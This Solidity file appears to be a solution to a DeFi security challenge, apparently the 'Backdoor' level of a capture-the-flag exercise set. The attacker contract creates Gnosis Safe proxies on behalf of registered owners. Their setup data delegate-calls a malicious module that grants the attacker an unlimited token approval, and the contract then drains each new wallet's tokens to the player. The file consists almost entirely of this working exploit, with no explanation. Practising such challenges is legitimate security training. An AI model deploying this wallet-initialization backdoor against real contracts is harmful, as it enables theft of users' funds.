// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IGnosisSafe {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);

    function createProxy(
        address singleton,
        bytes memory data
    ) external returns (address proxy);

    function calculateCreateProxyWithNonceAddress(
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external returns (address proxy);

    function createProxyWithNonce(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce
    ) external returns (address proxy);
}

contract testWalletRegistry {
    address player;
    address gnosisSafe;
    address token;
    address[] owners;
    uint globalIndex;
    address WalletRegistry;
    address gnosisSafeFacotry;
    address[4] proxys;
    address self;

    constructor(
        address _token,
        address _player,
        address[] memory _owners,
        address _gnosisSafe,
        address _gnosisSafeFacotry,
        address _WalletRegistry
    ) {
        self = address(this);
        console.log("self", self);
        token = _token;
        player = _player;
        owners = _owners;
        gnosisSafe = _gnosisSafe;
        gnosisSafeFacotry = _gnosisSafeFacotry;
        WalletRegistry = _WalletRegistry;

        module m = new module();
        while (globalIndex < 4) {
            address[] memory owner = new address[](1);
            owner[0] = owners[globalIndex];
            bytes memory data = abi.encodeWithSelector(
                this.setup.selector,
                owner,
                1,
                address(m),
                abi.encodeWithSignature(
                    "approve(address,address)",
                    token,
                    self
                ),
                address(0),
                address(this),
                0,
                address(this)
            );

            address proxy = IGnosisSafe(gnosisSafeFacotry)
                .createProxyWithCallback(
                    gnosisSafe,
                    data,
                    globalIndex,
                    WalletRegistry
                );
            printTokenBalance(token, proxy, "one proxy");
            console.log("allowance", IERC20(token).allowance(proxy, self));
            IERC20(token).transferFrom(
                proxy,
                player,
                IERC20(token).balanceOf(proxy)
            );
            globalIndex++;
        }
    }

    function end() external {}

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {}

    fallback() external payable {}

    receive() external payable {}
}

contract module {
    function approve(address _token, address spender) public {
        IERC20(_token).approve(spender, type(uint256).max);
    }
}
